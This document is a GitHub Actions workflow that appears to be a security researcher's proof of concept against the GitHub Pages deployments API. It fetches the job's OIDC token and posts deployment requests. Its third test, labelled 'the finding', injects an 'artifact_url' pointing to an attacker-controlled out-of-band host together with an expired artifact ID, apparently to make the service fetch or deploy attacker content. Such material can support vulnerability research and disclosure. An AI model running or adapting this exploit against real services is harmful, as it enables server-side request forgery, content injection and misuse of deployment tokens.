name: bf45-content-type-test
on:
  workflow_dispatch:
    inputs:
      oob: { required: true }
permissions:
  contents: read
  pages: write
  id-token: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
    steps:
      - run: mkdir -p _site && echo '<html>ctype</html>' > _site/index.html
      - uses: actions/upload-pages-artifact@v3
        with: { path: _site }
      - name: content-type-test
        env:
          GH_TOKEN: ${{ github.token }}
          OOB: ${{ inputs.oob }}
        run: |
          set -u
          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                      "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
          echo "::add-mask::$OIDC"
          
          API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
          ART_ID=$(curl -s -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/artifacts" | \
            jq -r '.artifacts[0].id')
          echo "Artifact: $ART_ID"
          
          # Test A: WITHOUT Content-Type (our broken approach)
          echo "===== TEST A: no Content-Type (expect 404) ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            "$API" \
            -d "{\"artifact_id\":$ART_ID,\"pages_build_version\":\"${GITHUB_SHA}-a\",\"oidc_token\":\"$OIDC\"}"
          
          sleep 3
          
          # Test B: WITH Content-Type: application/json (Octokit's approach)
          echo "===== TEST B: with Content-Type: application/json ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -H "Content-Type: application/json" \
            "$API" \
            -d "{\"artifact_id\":$ART_ID,\"pages_build_version\":\"${GITHUB_SHA}-b\",\"oidc_token\":\"$OIDC\"}"
          
          sleep 3
          
          # Test C: with Content-Type + EXPIRED artifact + attacker URL (the finding)
          echo "===== TEST C: Content-Type + expired artifact + attacker URL ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -H "Content-Type: application/json" \
            "$API" \
            -d "{\"artifact_id\":10387063794,\"artifact_url\":\"https://$OOB/vfy-bf45/ctype?arm=C\",\"pages_build_version\":\"${GITHUB_SHA}-c\",\"oidc_token\":\"$OIDC\",\"environment\":\"github-pages\"}"
          
          echo "===== waiting 60s ====="
          sleep 60
